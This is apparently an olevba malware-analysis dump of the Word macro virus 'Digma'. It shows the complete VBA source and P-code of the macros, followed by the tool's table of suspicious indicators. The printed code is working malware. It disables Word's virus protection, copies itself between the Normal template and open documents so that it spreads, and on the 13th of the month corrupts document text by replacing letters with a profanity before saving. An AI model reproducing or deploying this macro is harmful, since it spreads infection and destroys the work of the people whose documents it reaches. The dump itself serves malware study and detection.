olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Digma
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Digma - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: ./Virus.MSWord.Digma - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoclose()
' Virus done by DigitalMadman
   Dim ditdgfgdfhsdf As Boolean
   ditdgfgdfhsdf = False
        Options.VirusProtection = ditdgfgdfhsdf
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 4
Dim sad, kio, yji, hjy, grt As String
Dim jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff As String
grt = Options.DefaultFilePath(wdCurrentFolderPath)
hjy = Options.DefaultFilePath(wdUserTemplatesPath)
If grt = hjy Then
grt = Options.DefaultFilePath(wdDocumentsPath)
End If
yji = "NewMacros"
Dim jlp, jpd, lop, sadfas As String
jpd = "\" & NormalTemplate.Name
jlp = hjy + jpd
sadfas = NormalTemplate.FullName
sad = ActiveDocument.FullName
kio = Options.DefaultFilePath(wdUserTemplatesPath)
kio = sad
jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff = sad
Dim fd, abc As String
Dim Notmallitems, Activitems As Byte
Dim ActiveDocitemname As String
Dim safdfasdfasdgsadgh As String
Activitems = ActiveDocument.VBProject.VBComponents.Count
Notmallitems = NormalTemplate.VBProject.VBComponents.Count
abc = Application.MacroContainer
Dim okl As Boolean
If abc = NormalTemplate.Name Then
okl = True
End If
If okl = True Then
Dim tuy As Boolean
If ActiveDocument.Name = NormalTemplate.Name Then
tuy = True
End If
If tuy = False Then
If Activitems > 1 Then
    Application.OrganizerDelete Source:=kio, Name _
        :=yji, Object:=wdOrganizerObjectProjectItems
        End If
    sad = jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff
   safdfasdfasdgsadgh = sad
    Application.OrganizerCopy Source:=jlp, _
    Destination:= _
       safdfasdfasdgsadgh, Name:=yji, Object _
        :=wdOrganizerObjectProjectItems
     End If
     End If
If Application.MacroContainer <> NormalTemplate.Name Then
If okl = False Then
If Notmallitems > 1 Then
    Application.OrganizerDelete Source:=jlp, _
        Name:=yji, Object:=wdOrganizerObjectProjectItems
        End If
    Application.OrganizerCopy Source:=kio, Destination:= _
        sadfas, Name:=yji, Object:= _
        wdOrganizerObjectProjectItems
        If ActiveDocument.Saved = False Then
        ActiveDocument.Save
        
        End If
        End If
End If
End Sub
Sub autoexit()
Dim hyukjnbfhgdr As String
hyukjnbfhgdr = DateTime.Date
hyukjnbfhgdr = Left(hyukjnbfhgdr, 5)
hyukjnbfhgdr = Right(hyukjnbfhgdr, 2)
If ActiveDocument.Name <> NormalTemplate.Name And ActiveDocument.Saved = True Then
If hyukjnbfhgdr = "13" Then
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "a"
        .Replacement.Text = "FUCK"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "o"
        .Replacement.Text = "FUCK"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    Selection.GoTo What:=wdGoToLine, Which:=wdGoToFirst, Count:=1, Name:=""
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = ""
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Font.Size = 72
    Selection.TypeText Text:="DIGITAL MADMAN"
    Selection.TypeParagraph
ActiveDocument.Save
End If
End If
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Digma
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/NewMacros - 6131 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub autoclose())
' Line #2:
' 	QuoteRem 0x0000 0x001C " Virus done by DigitalMadman"
' Line #3:
' 	Dim 
' 	VarDefn ditdgfgdfhsdf (As Boolean)
' Line #4:
' 	LitVarSpecial (False)
' 	St ditdgfgdfhsdf 
' Line #5:
' 	Ld ditdgfgdfhsdf 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #7:
' 	LitDI2 0x0004 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #8:
' 	Dim 
' 	VarDefn sad
' 	VarDefn kio
' 	VarDefn yji
' 	VarDefn hjy
' 	VarDefn grt (As String)
' Line #9:
' 	Dim 
' 	VarDefn jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff (As String)
' Line #10:
' 	Ld wdCurrentFolderPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St grt 
' Line #11:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St hjy 
' Line #12:
' 	Ld grt 
' 	Ld hjy 
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St grt 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitStr 0x0009 "NewMacros"
' 	St yji 
' Line #16:
' 	Dim 
' 	VarDefn jlp
' 	VarDefn jpd
' 	VarDefn lop
' 	VarDefn sadfas (As String)
' Line #17:
' 	LitStr 0x0001 "\"
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Concat 
' 	St jpd 
' Line #18:
' 	Ld hjy 
' 	Ld jpd 
' 	Add 
' 	St jlp 
' Line #19:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St sadfas 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St sad 
' Line #21:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St kio 
' Line #22:
' 	Ld sad 
' 	St kio 
' Line #23:
' 	Ld sad 
' 	St jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff 
' Line #24:
' 	Dim 
' 	VarDefn fd
' 	VarDefn abc (As String)
' Line #25:
' 	Dim 
' 	VarDefn Notmallitems
' 	VarDefn Activitems (As Byte)
' Line #26:
' 	Dim 
' 	VarDefn ActiveDocitemname (As String)
' Line #27:
' 	Dim 
' 	VarDefn safdfasdfasdgsadgh (As String)
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St Activitems 
' Line #29:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St Notmallitems 
' Line #30:
' 	Ld Application 
' 	MemLd MacroContainer 
' 	St abc 
' Line #31:
' 	Dim 
' 	VarDefn okl (As Boolean)
' Line #32:
' 	Ld abc 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St okl 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld okl 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Dim 
' 	VarDefn tuy (As Boolean)
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitVarSpecial (True)
' 	St tuy 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld tuy 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld Activitems 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #42:
' 	LineCont 0x0004 08 00 08 00
' 	Ld kio 
' 	ParamNamed Source 
' 	Ld yji 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff 
' 	St sad 
' Line #45:
' 	Ld sad 
' 	St safdfasdfasdgsadgh 
' Line #46:
' 	LineCont 0x000C 07 00 04 00 09 00 07 00 10 00 08 00
' 	Ld jlp 
' 	ParamNamed Source 
' 	Ld safdfasdfasdgsadgh 
' 	ParamNamed Destination 
' 	Ld yji 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld Application 
' 	MemLd MacroContainer 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #50:
' 	Ld okl 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #51:
' 	Ld Notmallitems 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #52:
' 	LineCont 0x0004 07 00 08 00
' 	Ld jlp 
' 	ParamNamed Source 
' 	Ld yji 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	LineCont 0x0008 09 00 08 00 11 00 08 00
' 	Ld kio 
' 	ParamNamed Source 
' 	Ld sadfas 
' 	ParamNamed Destination 
' 	Ld yji 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub autoexit())
' Line #63:
' 	Dim 
' 	VarDefn hyukjnbfhgdr (As String)
' Line #64:
' 	Ld DateTime 
' 	MemLd Date 
' 	St hyukjnbfhgdr 
' Line #65:
' 	Ld hyukjnbfhgdr 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	St hyukjnbfhgdr 
' Line #66:
' 	Ld hyukjnbfhgdr 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	St hyukjnbfhgdr 
' Line #67:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #68:
' 	Ld hyukjnbfhgdr 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	IfBlock 
' Line #69:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #70:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #71:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #72:
' 	LitStr 0x0001 "a"
' 	MemStWith Then 
' Line #73:
' 	LitStr 0x0004 "FUCK"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #74:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #75:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #76:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #77:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #78:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #79:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #80:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #81:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #82:
' 	EndWith 
' Line #83:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #84:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #85:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #86:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #87:
' 	LitStr 0x0001 "o"
' 	MemStWith Then 
' Line #88:
' 	LitStr 0x0004 "FUCK"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #89:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #90:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #91:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #92:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #93:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #94:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #95:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #96:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #97:
' 	EndWith 
' Line #98:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #99:
' 	Ld wdGoToLine 
' 	ParamNamed What 
' 	Ld wdGoToFirst 
' 	ParamNamed Which 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	LitStr 0x0000 ""
' 	ParamNamed New 
' 	Ld Selection 
' 	ArgsMemCall If 0x0004 
' Line #100:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #101:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #102:
' 	LitStr 0x0000 ""
' 	MemStWith Then 
' Line #103:
' 	LitStr 0x0000 ""
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #104:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #105:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #106:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #107:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #108:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #109:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #110:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #111:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #112:
' 	EndWith 
' Line #113:
' 	LitDI2 0x0048 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #114:
' 	LitStr 0x000E "DIGITAL MADMAN"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #115:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #116:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	EndSub 
' Line #120:
' Line #121:
' Line #122:
' Line #123:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

